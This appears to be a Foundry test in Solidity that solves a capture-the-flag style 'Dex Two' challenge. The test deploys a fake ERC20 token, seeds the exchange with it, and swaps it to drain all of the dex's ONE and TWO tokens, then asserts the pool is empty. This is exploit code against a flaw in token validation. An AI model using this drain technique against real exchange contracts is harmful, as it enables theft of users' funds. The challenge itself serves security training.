// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import { SwappableToken } from "../Dex/Dex.sol";
import { DexTwo, SwappableTokenTwo } from "./DexTwo.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract DexTest is Test {
    DexTwo dex;

    SwappableTokenTwo ONE;
    SwappableTokenTwo TWO;

    address deployer = vm.addr(4);
    address whale = vm.addr(1777);
    address h3x0r = vm.addr(1337);

    function setUp() public {
        vm.startPrank(deployer);
        ONE = new SwappableTokenTwo(address(0), "Numero Uno", "ONE", 110);
        TWO = new SwappableTokenTwo(address(0), "Numero Dos", "TWO", 110);
        dex = new DexTwo(address(ONE), address(TWO));
        ONE.transfer(whale, 100);
        TWO.transfer(whale, 100);
        ONE.transfer(h3x0r, 10);
        TWO.transfer(h3x0r, 10);
        vm.stopPrank();

        vm.startPrank(whale);
        ONE.approve(address(dex), 100);
        TWO.approve(address(dex), 100);
        dex.add_liquidity(address(ONE), 100);
        dex.add_liquidity(address(TWO), 100);
        vm.stopPrank();
    }

    function balanceLogger() internal {
        emit log_named_uint("h3x0r ONE balance", ONE.balanceOf(h3x0r));
        emit log_named_uint("h3x0r TWO balance", TWO.balanceOf(h3x0r));
        emit log_named_uint("dex ONE balance", ONE.balanceOf(address(dex)));
        emit log_named_uint("dex TWO balance", TWO.balanceOf(address(dex)));
        console.log("----------------------");
    }


    function testDexTwoHack() public {
        vm.startPrank(h3x0r);
        balanceLogger();

        ERC20 FAKE = new ERC20("Fake Token", "FAKE");
        deal(address(FAKE), h3x0r, 400);

        FAKE.approve(address(dex), 300);
        FAKE.transfer(address(dex), 100);
        dex.swap(address(FAKE), address(ONE), 100);
        dex.swap(address(FAKE), address(TWO), 200);

        balanceLogger();
        assertEq(ONE.balanceOf(address(dex)), 0);
        assertEq(TWO.balanceOf(address(dex)), 0);
    }
}